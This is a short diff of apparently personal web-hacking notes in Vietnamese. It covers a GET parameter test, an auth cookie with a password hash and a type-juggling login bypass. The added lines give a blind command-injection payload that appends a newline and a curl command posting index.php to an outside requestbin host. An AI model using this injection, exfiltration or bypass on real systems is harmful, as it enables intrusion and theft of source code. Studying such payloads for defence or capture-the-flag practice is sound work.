@@ -20,5 +20,9 @@ echo $get ; // lúc trưa truyền thì in ra notme , khi get=jjjj in ra jjj
  
  auth={"data":{"login":"a","password":"ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb"}}
  có thể ép kiểu true= {"login":true}
+ 
+ 
+ ---
+ ip=localhost%0Acurl -X POST -F file=@index.php https://requestbin.fullcontact.com/  blind commandline , in ra 1 file
 
 
